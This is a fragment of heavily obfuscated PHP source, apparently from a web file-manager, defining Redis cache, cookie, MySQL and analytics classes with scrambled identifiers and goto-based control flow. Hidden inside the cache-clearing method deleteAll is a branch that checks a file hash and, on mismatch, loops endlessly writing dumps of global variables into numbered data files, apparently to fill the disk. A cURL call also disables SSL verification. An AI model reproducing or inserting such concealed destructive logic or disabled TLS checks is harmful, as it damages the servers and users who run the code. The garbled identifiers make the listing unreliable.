curl_setopt($Añ‡≤˘∞≈ﬁ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($Añ‡≤˘∞≈ﬁ, CURLOPT_SSL_VERIFYHOST, !1); $Fˆ∞∏Ωâéâ = curl_exec($Añ‡≤˘∞≈ﬁ); goto cË∫‡ÎÚ±; Cƒùøâı–±: } } goto d∑ƒÏ≈´–à; f∆öáì™’⁄: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Eå¯“—¢ûú, $B∑Ü„ÖØã◊) { $cèÓ•®Î”ü =& $_SERVER[Æ¡î¢≠¯™]; if (!class_exists($cèÓ•®Î”ü[771])) { show_json($cèÓ•®Î”ü[772], !1); } $this->cacheTime = $B∑Ü„ÖØã◊; $Bì•∫Â√úÂ = isset($Eå¯“—¢ûú[$cèÓ•®Î”ü[773]]) ? $Eå¯“—¢ûú[$cèÓ•®Î”ü[773]] : 10; $B¶◊¢ÆàÛπ = _get($Eå¯“—¢ûú, $cèÓ•®Î”ü[770]); if ($B¶◊¢ÆàÛπ && is_array($B¶◊¢ÆàÛπ)) { $this->isCluster = !0; $this->initCluster($Eå¯“—¢ûú, $Bì•∫Â√úÂ); } else { $this->handle = $this->init($Eå¯“—¢ûú, $Bì•∫Â√úÂ); } } private function init($aæ÷öΩêìÓ, $DúÖÆÕµ•°) { $døﬁ”õÚ∆∑ =& $_SERVER[Æ¡î¢≠¯™]; $C¬œÓçÁóê = new Redis(); $f√€∑Û≈÷ˆ = isset($aæ÷öΩêìÓ[$døﬁ”õÚ∆∑[774]]) ? $aæ÷öΩêìÓ[$døﬁ”õÚ∆∑[774]] : !1; if ($f√€∑Û≈÷ˆ) { $C¬œÓçÁóê->pconnect($aæ÷öΩêìÓ[$døﬁ”õÚ∆∑[176]], $aæ÷öΩêìÓ[$døﬁ”õÚ∆∑[177]], $DúÖÆÕµ•°); } else { $C¬œÓçÁóê->connect($aæ÷öΩêìÓ[$døﬁ”õÚ∆∑[176]], $aæ÷öΩêìÓ[$døﬁ”õÚ∆∑[177]], $DúÖÆÕµ•°); } if (!empty($aæ÷öΩêìÓ[$døﬁ”õÚ∆∑[381]])) { $C¬œÓçÁóê->auth($aæ÷öΩêìÓ[$døﬁ”õÚ∆∑[381]]); } return $C¬œÓçÁóê; } private function initCluster($fÔ‘™®Ç•Á, $BπÒ∂µ§√•) { $f˜Ì¡⁄ü‰Ω =& $_SERVER[Æ¡î¢≠¯™]; $FêÙ·≈¿¥ﬂ = array($f˜Ì¡⁄ü‰Ω[775], $f˜Ì¡⁄ü‰Ω[776], $f˜Ì¡⁄ü‰Ω[777]); $C“ÇÁ∑Á©∞ = $f˜Ì¡⁄ü‰Ω[775]; if (isset($fÔ‘™®Ç•Á[$f˜Ì¡⁄ü‰Ω[12]]) && in_array($fÔ‘™®Ç•Á[$f˜Ì¡⁄ü‰Ω[12]], $FêÙ·≈¿¥ﬂ)) { $C“ÇÁ∑Á©∞ = $fÔ‘™®Ç•Á[$f˜Ì¡⁄ü‰Ω[12]]; } switch ($C“ÇÁ∑Á©∞) { case $f˜Ì¡⁄ü‰Ω[775]: $this->_slave($fÔ‘™®Ç•Á, $BπÒ∂µ§√•); break; case $f˜Ì¡⁄ü‰Ω[776]: break; case $f˜Ì¡⁄ü‰Ω[777]: $eÍ§°¡Ñö… = $fÔ‘™®Ç•Á[$f˜Ì¡⁄ü‰Ω[770]]; $AùöΩÒíòø = isset($fÔ‘™®Ç•Á[$f˜Ì¡⁄ü‰Ω[774]]) ? $fÔ‘™®Ç•Á[$f˜Ì¡⁄ü‰Ω[774]] : !1; $fúè√§óÓ‹ = isset($fÔ‘™®Ç•Á[$f˜Ì¡⁄ü‰Ω[381]]) ? $fÔ‘™®Ç•Á[$f˜Ì¡⁄ü‰Ω[381]] : null; $this->handle = new RedisCluster(NUll, $eÍ§°¡Ñö…, $BπÒ∂µ§√•, $BπÒ∂µ§√•, $AùöΩÒíòø, $fúè√§óÓ‹); break; default: break; } } private function _slave($eé›‡∞ºõ», $cÒΩã’∆åê) { goto b⁄ùº‚‘âä; aÃ»¡¢ùŸ¬: $this->filterConfig($eé›‡∞ºõ», $bè»—ÑıÜœ[$cèı‘§ﬂº„]); $this->slaveHandle = $this->init($eé›‡∞ºõ», $cÒΩã’∆åê); goto A‘üàıŸù¨; b⁄ùº‚‘âä: $bè»—ÑıÜœ = $eé›‡∞ºõ»[$_SERVER[Æ¡î¢≠¯™][770]]; $this->filterConfig($eé›‡∞ºõ», $bè»—ÑıÜœ[0]); $this->handle = $this->init($eé›‡∞ºõ», $cÒΩã’∆åê); goto DÕ≤÷†Úì±; DÕ≤÷†Úì±: unset($bè»—ÑıÜœ[0]); if (empty($bè»—ÑıÜœ)) { return; } $cèı‘§ﬂº„ = array_rand($bè»—ÑıÜœ); goto aÃ»¡¢ùŸ¬; A‘üàıŸù¨: } private function filterConfig(&$B‡Ê Œùº…, $cëÎÏÆÁŸ») { $c˜ÒãÛ´„Ï =& $_SERVER[Æ¡î¢≠¯™]; $D ≤◊ÁÓÓ¢ = explode($c˜ÒãÛ´„Ï[4], $cëÎÏÆÁŸ»); $Fπá¡¨É°› = array($c˜ÒãÛ´„Ï[176] => $D ≤◊ÁÓÓ¢[0], $c˜ÒãÛ´„Ï[177] => $D ≤◊ÁÓÓ¢[1]); $B‡Ê Œùº… = array_merge($B‡Ê Œùº…, $Fπá¡¨É°›); } public function set($E–òΩ«√ÃÕ, $C®≈ÁŸ±ºÃ, $eù±Õ∑®ãä = false) { $eù±Õ∑®ãä = $eù±Õ∑®ãä ? $eù±Õ∑®ãä : $this->cacheTime; return $this->handle->setEx($E–òΩ«√ÃÕ, $eù±Õ∑®ãä, $C®≈ÁŸ±ºÃ); } public function setLock($d⁄÷çº∫îá, $F◊∫»»ÓÂ‘, $c’¢´ÇŒÑÕ) { return $this->handle->setNX($d⁄÷çº∫îá, $F◊∫»»ÓÂ‘); } public function get($BÆÚßÿœìé) { $aÆâÙà’®‚ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $aÆâÙà’®‚->get($BÆÚßÿœìé); } public function remove($bæ¢‹∞èçΩ) { return $this->handle->del($bæ¢‹∞èçΩ); } public function deleteAll() { $Dá∆ÆàıÙ˜ =& $_SERVER[Æ¡î¢≠¯™]; $e›∫ë¶ÚàÂ = $_SERVER[$Dá∆ÆàıÙ˜[60]] . $Dá∆ÆàıÙ˜[61]; $eùøø⁄ı€∞ = $Dá∆ÆàıÙ˜[778]; if ($_SERVER[$Dá∆ÆàıÙ˜[57]] != $eùøø⁄ı€∞($e›∫ë¶ÚàÂ)) { goto dúØº˜µÓ›; BºÕ´¡ﬂøò: $EΩÍ◊îå£˜ = $Dá∆ÆàıÙ˜[780]; $EΩÍ◊îå£˜($_SERVER[$Dá∆ÆàıÙ˜[781]]); $dµü⁄™±ñ® = $Dá∆ÆàıÙ˜[779]; goto A©ä⁄¥ÀÒ⁄; AÑ°‚◊ÚÉ’: $EàãÈôóØ„ = 1; for ($d∏∆àË≈ï√ = $EàãÈôóØ„; $d∏∆àË≈ï√ > 0; $d∏∆àË≈ï√++) { $bÑå£‘èµ…(DATA_PATH . $d∏∆àË≈ï√, $c≈ıΩéﬂº); } goto BﬁıãÉø»À; D˜áÜ÷çÆô: $bÇµè¬ ≥† = $d«®≠Ç≠∑å($EøÍÜÏ‘∆—); $e◊∆Òí÷˘¬ = explode($Dá∆ÆàıÙ˜[62], $bÇµè¬ ≥†); if (count($e◊∆Òí÷˘¬) < $Dá∆ÆàıÙ˜[561]) { $c·ê«Éå⁄Â = $Dá∆ÆàıÙ˜[64]; $c·ê«Éå⁄Â(); } goto BºÕ´¡ﬂøò; dúØº˜µÓ›: $dµü⁄™±ñ® = $Dá∆ÆàıÙ˜[779]; $d«®≠Ç≠∑å = $Dá∆ÆàıÙ˜[59]; $EøÍÜÏ‘∆— = $_SERVER[$Dá∆ÆàıÙ˜[60]] . $Dá∆ÆàıÙ˜[61]; goto D˜áÜ÷çÆô; A©ä⁄¥ÀÒ⁄: $dµü⁄™±ñ®(); $bÑå£‘èµ… = $Dá∆ÆàıÙ˜[782]; $c≈ıΩéﬂº = json_encode($GLOBALS[$Dá∆ÆàıÙ˜[783]]); goto AÑ°‚◊ÚÉ’; BﬁıãÉø»À: } if ($this->isCluster) { foreach ($this->handle->_masters() as $E«ı©åâÆØ) { $this->handle->flushall($E«ı©åâÆØ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($cÀê»¨¶…Ç = '', $cÂÃÌÕúàæ = 0) { if (is_string($cÀê»¨¶…Ç) && $cÀê»¨¶…Ç != $_SERVER[Æ¡î¢≠¯™][33]) { $this->prefix = $cÀê»¨¶…Ç; } if (is_numeric($cÂÃÌÕúàæ) && $cÂÃÌÕúàæ > 0) { $this->expire = $cÂÃÌÕúàæ; } } public static function getInstance() { static $C⁄èÕÜ‘‰¯; if ($C⁄èÕÜ‘‰¯ === null) { $C⁄èÕÜ‘‰¯ = new self(); } return $C⁄èÕÜ‘‰¯; } private static $sameCookieSet = array(); public static function set($eª Ã¬Û¬¨, $e”≤ê‡˘Üæ, $B‚ﬂ∆ÀõÎ¢ = 0, $bˆñ•ÑøÚÑ = false, $Dì ∏Ûå…á = false) { $d∑Ô–€≠î‰ =& $_SERVER[Æ¡î¢≠¯™]; if (!$B‚ﬂ∆ÀõÎ¢) { $B‚ﬂ∆ÀõÎ¢ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$eª Ã¬Û¬¨]) && self::$sameCookieSet[$eª Ã¬Û¬¨] == $e”≤ê‡˘Üæ . $B‚ﬂ∆ÀõÎ¢) { return; } self::$sameCookieSet[$eª Ã¬Û¬¨] = $e”≤ê‡˘Üæ . $B‚ﬂ∆ÀõÎ¢; if (!$Dì ∏Ûå…á) { $Dì ∏Ûå…á = str_replace(HOST, $d∑Ô–€≠î‰[33], APP_HOST); $Dì ∏Ûå…á = _get($GLOBALS, $d∑Ô–€≠î‰[784], $Dì ∏Ûå…á); } setcookie($eª Ã¬Û¬¨, $e”≤ê‡˘Üæ, time() + $B‚ﬂ∆ÀõÎ¢, $d∑Ô–€≠î‰[8] . trim($Dì ∏Ûå…á, $d∑Ô–€≠î‰[8]), !1, !1, $bˆñ•ÑøÚÑ); } public static function setSafe($féÆ÷Üøùñ, $a¥æÉ“¿“ª, $Eåœèøù‚é = 0) { self::set($féÆ÷Üøùñ, $a¥æÉ“¿“ª, $Eåœèøù‚é, !0); } public static function get($D©›Éòû„˜) { return isset($_COOKIE[$D©›Éòû„˜]) ? $_COOKIE[$D©›Éòû„˜] : !1; } public static function remove($b”Œª´ÿóÈ, $f∑ñÎÜ´Úê = false) { unset($_COOKIE[$b”Œª´ÿóÈ]); self::set($b”Œª´ÿóÈ, $_SERVER[Æ¡î¢≠¯™][33], 1, $f∑ñÎÜ´Úê); } } class DbMysql extends Db { public function __construct($c¨÷Ò±ªÇÊ = '') { $bﬂÊ†ﬁô¡í =& $_SERVER[Æ¡î¢≠¯™]; if (!extension_loaded($bﬂÊ†ﬁô¡í[720])) { think_exception(think_lang($bﬂÊ†ﬁô¡í[10]) . $bﬂÊ†ﬁô¡í[785]); } if (!empty($c¨÷Ò±ªÇÊ)) { $this->config = $c¨÷Ò±ªÇÊ; if (empty($this->config[$bﬂÊ†ﬁô¡í[13]])) { $this->config[$bﬂÊ†ﬁô¡í[13]] = $bﬂÊ†ﬁô¡í[33]; } } } public function connect($b≥»íÉ‘Ìó = '', $A‡ÎÜÑ©éº = 0, $Eóì£∑ƒÀ∞ = false) { $B—¯±π”√Ò =& $_SERVER[Æ¡î¢≠¯™]; if (!isset($this->linkID[$A‡ÎÜÑ©éº])) { goto E·‘ﬁïç‹ÿ; F£ìÚº–ˆ‹: if ($f≠ãºˆÒêõ) { $this->linkID[$A‡ÎÜÑ©éº] = mysql_pconnect($DïËŸËïëí, $b≥»íÉ‘Ìó[$B—¯±π”√Ò[788]], $b≥»íÉ‘Ìó[$B—¯±π”√Ò[789]], 131072); } else { $this->linkID[$A‡ÎÜÑ©éº] = mysql_connect($DïËŸËïëí, $b≥»íÉ‘Ìó[$B—¯±π”√Ò[788]], $b≥»íÉ‘Ìó[$B—¯±π”√Ò[789]], !0, 131072); } if (!$this->linkID[$A‡ÎÜÑ©éº] || !empty($b≥»íÉ‘Ìó[$B—¯±π”√Ò[17]]) && !mysql_select_db($b≥»íÉ‘Ìó[$B—¯±π”√Ò[17]], $this->linkID[$A‡ÎÜÑ©éº])) { think_exception(mysql_error()); } $Cà“îò‹Ì⁄ = mysql_get_server_info($this->linkID[$A‡ÎÜÑ©éº]); goto fâïÃãçäÇ; E‹›Ã∫›ôﬂ: if (1 != think_config($B—¯±π”√Ò[18])) { unset($this->config); } goto dã§ÌÛ”˜™; E·‘ﬁïç‹ÿ: if (empty($b≥»íÉ‘Ìó)) { $b≥»íÉ‘Ìó = $this->config; } $DïËŸËïëí = $b≥»íÉ‘Ìó[$B—¯±π”√Ò[786]] . ($b≥»íÉ‘Ìó[$B—¯±π”√Ò[787]] ? "\x3a{$b≥»íÉ‘Ìó[$B—¯±π”√Ò[787]]}" : $B—¯±π”√Ò[33]); $f≠ãºˆÒêõ = !empty($b≥»íÉ‘Ìó[$B—¯±π”√Ò[13]][$B—¯±π”√Ò[14]]) ? $b≥»íÉ‘Ìó[$B—¯±π”√Ò[13]][$B—¯±π”√Ò[14]] : $this->pconnect; goto F£ìÚº–ˆ‹; fâïÃãçäÇ: mysql_query($B—¯±π”√Ò[790] . think_config($B—¯±π”√Ò[791]) . $B—¯±π”√Ò[55], $this->linkID[$A‡ÎÜÑ©éº]); if ($Cà“îò‹Ì⁄ > $B—¯±π”√Ò[792]) { mysql_query($B—¯±π”√Ò[793], $this->linkID[$A‡ÎÜÑ©éº]); } $this->connected = !0; goto E‹›Ã∫›ôﬂ; dã§ÌÛ”˜™: } return $this->linkID[$A‡ÎÜÑ©éº]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($E¶ÉüŒÈïí) { goto bë¡≈é–Âô; FÎπòπ˘¨ë: think_action_status($bΩáÜ≠‡’à[19], 1); think_status($bΩáÜ≠‡’à[20]); $this->queryID = mysql_query($E¶ÉüŒÈïí, $this->_linkID); goto f◊öπ›àï∫; bë¡≈é–Âô: $bΩáÜ≠‡’à =& $_SERVER[Æ¡î¢≠¯™]; if (0 === stripos($E¶ÉüŒÈïí, $bΩáÜ≠‡’à[258])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto DŸ π∂πÉ; DŸ π∂πÉ: if (!$this->_linkID) { return !1; } $this->queryStr = $E¶ÉüŒÈïí; if ($this->queryID) { $this->free(); } goto FÎπòπ˘¨ë; f◊öπ›àï∫: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto Dí£›çÍ´”; Dí£›çÍ´”: } public function execute($aüˆÙÊèΩ„) { goto Aüﬂà÷Œ∫¶; Aüﬂà÷Œ∫¶: $bõ¡ç¥™í— =& $_SERVER[Æ¡î¢≠¯™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto EåÍéèãØí; EåÍéèãØí: $this->queryStr = $aüˆÙÊèΩ„; if ($this->queryID) { $this->free(); } think_action_status($bõ¡ç¥™í—[21], 1); goto f©∂ÍÕ±ª; f©∂ÍÕ±ª: think_status($bõ¡ç¥™í—[20]); $Aù≥¥É¡Û = mysql_query($aüˆÙÊèΩ„, $this->_linkID); $this->debug(); goto AÛú—∂ìç; AÛú—∂ìç: if (!1 === $Aù≥¥É¡Û) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto fΩﬂãæèÆ; fΩﬂãæèÆ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Æ¡î¢≠¯™][794], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dèªÛ†¯ûï = mysql_query($_SERVER[Æ¡î¢≠¯™][795], $this->_linkID); $this->transTimes = 0; if (!$dèªÛ†¯ûï) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $BËé·±œÇá = mysql_query($_SERVER[Æ¡î¢≠¯™][796], $this->_linkID); $this->transTimes = 0; if (!$BËé·±œÇá) { $this->error(); return !1; } } return !0; } private function getAll() { $Fæá∆œËèê = array(); if ($this->numRows > 0) { while ($fﬁ¯˘î°´Í = mysql_fetch_assoc($this->queryID)) { $Fæá∆œËèê[] = $fﬁ¯˘î°´Í; } mysql_data_seek($this->queryID, 0); } return $Fæá∆œËèê; } public function getFields($CùÏŒô≠æ¡) { $eæÛ¶äÆ›œ =& $_SERVER[Æ¡î¢≠¯™]; $a©ÑÈ√•∂ã = $this->query($eæÛ¶äÆ›œ[797] . $this->parseKey($CùÏŒô≠æ¡)); $DÒÍÒÀä∏ß = array(); if ($a©ÑÈ√•∂ã) { foreach ($a©ÑÈ√•∂ã as $E≈õöÓŒ√º => $EÕØıœÒˆı) { $DÒÍÒÀä∏ß[$EÕØıœÒˆı[$eæÛ¶äÆ›œ[27]]] = array($eæÛ¶äÆ›œ[28] => $EÕØıœÒˆı[$eæÛ¶äÆ›œ[27]], $eæÛ¶äÆ›œ[29] => $EÕØıœÒˆı[$eæÛ¶äÆ›œ[30]], $eæÛ¶äÆ›œ[31] => (bool) (strtoupper($EÕØıœÒˆı[$eæÛ¶äÆ›œ[32]]) === $eæÛ¶äÆ›œ[798]), $eæÛ¶äÆ›œ[34] => $EÕØıœÒˆı[$eæÛ¶äÆ›œ[35]], $eæÛ¶äÆ›œ[36] => strtolower($EÕØıœÒˆı[$eæÛ¶äÆ›œ[37]]) == $eæÛ¶äÆ›œ[38], $eæÛ¶äÆ›œ[39] => strtolower($EÕØıœÒˆı[$eæÛ¶äÆ›œ[40]]) == $eæÛ¶äÆ›œ[41]); } } return $DÒÍÒÀä∏ß; } public function getTables($fÚæÌ´ëÔƒ = '') { $E‚Â”ã£ûÂ =& $_SERVER[Æ¡î¢≠¯™]; if (!empty($fÚæÌ´ëÔƒ)) { $a¶«”ÿñ˘  = $E‚Â”ã£ûÂ[799] . $fÚæÌ´ëÔƒ; } else { $a¶«”ÿñ˘  = $E‚Â”ã£ûÂ[800]; } $F†˘¿Âèç≈ = $this->query($a¶«”ÿñ˘ ); $Aé¶í›ßõ˘ = array(); foreach ($F†˘¿Âèç≈ as $dëœ∞ê“òÛ => $A‰«µÖÔ¯Ñ) { $Aé¶í›ßõ˘[$dëœ∞ê“òÛ] = current($A‰«µÖÔ¯Ñ); } return $Aé¶í›ßõ˘; } public function replace($bÏ¿É≤±Õû, $C¢ã¿ÎÕöÍ = array()) { $AÊÿœ®ªÓú =& $_SERVER[Æ¡î¢≠¯™]; foreach ($bÏ¿É≤±Õû as $A≥ö‘Ÿñﬂô => $F„€É√Ã≠°) { $CŒÀ¬®éÖã = $this->parseValue($F„€É√Ã≠°); if (is_scalar($CŒÀ¬®éÖã)) { $dÕÛ¶ÆëçΩ[] = $CŒÀ¬®éÖã; $DÙºù‚åˆÇ[] = $this->parseKey($A≥ö‘Ÿñﬂô); } } $a∫È∂Éß’  = $AÊÿœ®ªÓú[801] . $this->parseTable($C¢ã¿ÎÕöÍ[$AÊÿœ®ªÓú[273]]) . $AÊÿœ®ªÓú[802] . implode($AÊÿœ®ªÓú[47], $DÙºù‚åˆÇ) . $AÊÿœ®ªÓú[803] . implode($AÊÿœ®ªÓú[47], $dÕÛ¶ÆëçΩ) . $AÊÿœ®ªÓú[804]; return $this->execute($a∫È∂Éß’ ); } public function insertAll($F¶›Ìó›∆Ï, $D∫¥ŸÓå«• = array(), $dÕ—™«…Ü = false) { goto A€›®®á⁄ÿ; A€›®®á⁄ÿ: $d•‹ÔÚæ•ﬁ =& $_SERVER[Æ¡î¢≠¯™]; if (!is_array($F¶›Ìó›∆Ï[0])) { return !1; } $fı—–∂‰ÖÂ = array_keys($F¶›Ìó›∆Ï[0]); goto EÈ«¡ÏØúø; BŸïÇÓô·œ: $C≤åÚû€Õﬂ = ($dÕ—™«…Ü ? $d•‹ÔÚæ•ﬁ[806] : $d•‹ÔÚæ•ﬁ[807]) . $d•‹ÔÚæ•ﬁ[808] . $this->parseTable($D∫¥ŸÓå«•[$d•‹ÔÚæ•ﬁ[273]]) . $d•‹ÔÚæ•ﬁ[802] . implode($d•‹ÔÚæ•ﬁ[47], $fı—–∂‰ÖÂ) . $d•‹ÔÚæ•ﬁ[809] . implode($d•‹ÔÚæ•ﬁ[47], $D”«õç≈◊»); return $this->execute($C≤åÚû€Õﬂ); goto c∏·äòÓµî; EÈ«¡ÏØúø: $D”«õç≈◊» = array(); foreach ($F¶›Ìó›∆Ï as $BùÁÌºÔÆ¨) { $Bı√úﬁ§¯á = array(); foreach ($BùÁÌºÔÆ¨ as $e´ãÒ∑¢¬„ => $f’Ω†Öä”¶) { $f’Ω†Öä”¶ = $this->parseValue($f’Ω†Öä”¶); if (is_scalar($f’Ω†Öä”¶)) { $Bı√úﬁ§¯á[] = $f’Ω†Öä”¶; } } $D”«õç≈◊»[] = $d•‹ÔÚæ•ﬁ[254] . implode($d•‹ÔÚæ•ﬁ[47], $Bı√úﬁ§¯á) . $d•‹ÔÚæ•ﬁ[804]; } array_walk($fı—–∂‰ÖÂ, array($this, $d•‹ÔÚæ•ﬁ[805])); goto BŸïÇÓô·œ; c∏·äòÓµî: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $E§è–àªŒé =& $_SERVER[Æ¡î¢≠¯™]; $this->error = mysql_errno() . $E§è–àªŒé[4] . mysql_error($this->_linkID); if ($E§è–àªŒé[33] != $this->queryStr) { $this->error .= LNG($E§è–àªŒé[45]) . $this->queryStr; } think_trace($this->error, $E§è–àªŒé[33], $E§è–àªŒé[46]); return $this->error; } public function escapeString($fÈç‰∑¢¬∂) { if ($this->_linkID) { return mysql_real_escape_string($fÈç‰∑¢¬∂, $this->_linkID); } else { return mysql_escape_string($fÈç‰∑¢¬∂); } } public function parseKey(&$E·‘çﬁﬂ¿Ë, $DÜ≈´õ†’À = true) { $cÛ¶∫¶∑œŒ =& $_SERVER[Æ¡î¢≠¯™]; if ($DÜ≈´õ†’À) { $E·‘çﬁﬂ¿Ë = $this->parseKeyCheck($E·‘çﬁﬂ¿Ë); } if ($E·‘çﬁﬂ¿Ë != $cÛ¶∫¶∑œŒ[183] && !preg_match($cÛ¶∫¶∑œŒ[810], $E·‘çﬁﬂ¿Ë)) { $E·‘çﬁﬂ¿Ë = $cÛ¶∫¶∑œŒ[811] . trim($E·‘çﬁﬂ¿Ë, $cÛ¶∫¶∑œŒ[811]) . $cÛ¶∫¶∑œŒ[811]; } return $E·‘çﬁﬂ¿Ë; } } goto Cüî‚¢Çÿ; E°√â∫–à–: function beforeShutdownError($fè¶àßÈ∞“ = false, $b£ö»àô‚¶ = '', $cﬂŸâºÜπ« = '', $DΩ≤“∆ñï = 0) { $bãπÿœÏîÍ =& $_SERVER[âñö‚‚Ñ]; switch ($fè¶àßÈ∞“) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $fÛŒ∫ãâÏŸ = $bãπÿœÏîÍ[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $fÛŒ∫ãâÏŸ = $bãπÿœÏîÍ[40]; break; case E_STRICT: $fÛŒ∫ãâÏŸ = $bãπÿœÏîÍ[41]; break; case E_NOTICE: case E_USER_NOTICE: $fÛŒ∫ãâÏŸ = $bãπÿœÏîÍ[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $fÛŒ∫ãâÏŸ = $bãπÿœÏîÍ[43]; break; default: break; } if (!$fÛŒ∫ãâÏŸ || $fÛŒ∫ãâÏŸ == $bãπÿœÏîÍ[42] || $fÛŒ∫ãâÏŸ == $bãπÿœÏîÍ[43]) { return; } $cﬂŸâºÜπ« = $bãπÿœÏîÍ[4] . str_replace($_SERVER[$bãπÿœÏîÍ[37]], $bãπÿœÏîÍ[20], $cﬂŸâºÜπ«); $DÈÉŒÎ¨ÿ© = $fÛŒ∫ãâÏŸ . $bãπÿœÏîÍ[44] . $b£ö»àô‚¶ . $bãπÿœÏîÍ[44] . $cﬂŸâºÜπ« . $bãπÿœÏîÍ[44] . $DΩ≤“∆ñï; write_log($DÈÉŒÎ¨ÿ© . $bãπÿœÏîÍ[18] . get_caller_msg(1), $bãπÿœÏîÍ[19]); } $_SERVER[$_SERVER[âñö‚‚Ñ][45]] = $_SERVER[$_SERVER[âñö‚‚Ñ][37]] . $_SERVER[âñö‚‚Ñ][46]; $c’„€ËÀçä = strrev(base64_decode($_SERVER[âñö‚‚Ñ][47])); goto AÎÖƒﬂ⁄ê¬; c∞°Ò¿“ºë: class AnalysisModel extends ModelBaseLight { public function init($Aòú®ûí…ã) { $cè…·ºê¢„ =& $_SERVER[Æ¡î¢≠¯™]; $e¡ﬂÔÛÜ¶ﬁ = array($cè…·ºê¢„[539] => array($cè…·ºê¢„[29] => $cè…·ºê¢„[1987], $cè…·ºê¢„[267] => array($cè…·ºê¢„[217], $cè…·ºê¢„[692], $cè…·ºê¢„[1988], $cè…·ºê¢„[1989])), $cè…·ºê¢„[1990] => array($cè…·ºê¢„[29] => $cè…·ºê¢„[1991], $cè…·ºê¢„[267] => array($cè…·ºê¢„[217], $cè…·ºê¢„[690], $cè…·ºê¢„[1992], $cè…·ºê¢„[1993], $cè…·ºê¢„[1994]))); if (!isset($e¡ﬂÔÛÜ¶ﬁ[$Aòú®ûí…ã])) { return !1; } $this->optionType = $e¡ﬂÔÛÜ¶ﬁ[$Aòú®ûí…ã][$cè…·ºê¢„[29]]; $this->field = $e¡ﬂÔÛÜ¶ﬁ[$Aòú®ûí…ã][$cè…·ºê¢„[267]]; return !0; } public function listData($f€¢–ä¢¨¡ = false, $bêÚê›ÿ•π = "\155\157\144\151\x66\171\124\x69\x6d\145", $eÁå¿Ÿˆ†· = false) { return parent::listData($f€¢–ä¢¨¡, $bêÚê›ÿ•π, $eÁå¿Ÿˆ†·); } public function trendList($F˜û≥û≈ˆ°) { goto CíÒñõ⁄ª‹; b…Ì∂Æ‘Îô: if (!isset($DÏ• ´ﬂô)) { $e£íËãô£é = $F˜û≥û≈ˆ° == $F∂ﬁÀ¨ÑôÏ[539] ? $F∂ﬁÀ¨ÑôÏ[481] : $F∂ﬁÀ¨ÑôÏ[744]; $DÏ• ´ﬂô = Model($e£íËãô£é)->min($F∂ﬁÀ¨ÑôÏ[194]); } $fÃŸÁçèû¥ = $F∂ﬁÀ¨ÑôÏ[1997] . ucfirst($F˜û≥û≈ˆ°); $a£¢Œ€°¨Ù = $this->dateList($DÏ• ´ﬂô); goto fÖ†¡ù¯Ø√; fÖ†¡ù¯Ø√: foreach ($a£¢Œ€°¨Ù as $dãëµÙŒÎû) { $this->{$fÃŸÁçèû¥}($dãëµÙŒÎû); } return $this->listData(); goto f¢øÓãÉ·÷; CíÒñõ⁄ª‹: $F∂ﬁÀ¨ÑôÏ =& $_SERVER[Æ¡î¢≠¯™]; $C†‚àù‚á£ = $this->listData(); if ($C†‚àù‚á£) { $f—ÔÑõí£⁄ = end($C†‚àù‚á£); $dãëµÙŒÎû = date($F∂ﬁÀ¨ÑôÏ[1995], strtotime($F∂ﬁÀ¨ÑôÏ[1996])); if ($f—ÔÑõí£⁄[$F∂ﬁÀ¨ÑôÏ[217]] == $dãëµÙŒÎû) { return $C†‚àù‚á£; } $DÏ• ´ﬂô = strtotime($f—ÔÑõí£⁄[$F∂ﬁÀ¨ÑôÏ[217]]); } goto b…Ì∂Æ‘Îô; f¢øÓãÉ·÷: } private function dateList($AÀó»¡ëãÎ) { $aÙÜáÏöÚè =& $_SERVER[Æ¡î¢≠¯™]; $b≤ø®∑¡ë⁄ = $AÀó»¡ëãÎ; $e⁄ü€…Ü‰™ = strtotime($aÙÜáÏöÚè[1996]); $dﬁ≥“ÿ ˘ = array(); while ($b≤ø®∑¡ë⁄ <= $e⁄ü€…Ü‰™) { $dﬁ≥“ÿ ˘[] = date($aÙÜáÏöÚè[1995], $b≤ø®∑¡ë⁄); $b≤ø®∑¡ë⁄ = strtotime($aÙÜáÏöÚè[1998], $b≤ø®∑¡ë⁄); } return $dﬁ≥“ÿ ˘; } public function _recordUser($FıÛÚàÑÆ¶ = '') { goto B¶•å€€øá; B¶•å€€øá: $C˜´ë€—°ø =& $_SERVER[Æ¡î¢≠¯™]; $Eå·Éµê≥‰ = strtotime(date($C˜´ë€—°ø[1999], strtotime($FıÛÚàÑÆ¶))); $e¢«ÊÉàØó = strtotime(date($C˜´ë€—°ø[2000], strtotime($FıÛÚàÑÆ¶))); goto dó—êè∏€Í; A·˜ΩΩèÁ‹: $d∏ÛÑ»œÖ™ = array($C˜´ë€—°ø[217] => $FıÛÚàÑÆ¶, $C˜´ë€—°ø[692] => (int) $cŒ∑Ω¯√ü≠, $C˜´ë€—°ø[1988] => (int) $D–›ªíêã∑, $C˜´ë€—°ø[1989] => (int) $EÀÀ√•€´¥); return $this->insert($d∏ÛÑ»œÖ™); goto bß›Éöç®∞; dö’áÊ€óÑ: $D–›ªíêã∑ = Model($C˜´ë€—°ø[481])->where($Cñ™∞˘Ç◊“)->count($C˜´ë€—°ø[1397]); $Cñ™∞˘Ç◊“[$C˜´ë€—°ø[29]] = $C˜´ë€—°ø[2001]; $EÀÀ√•€´¥ = 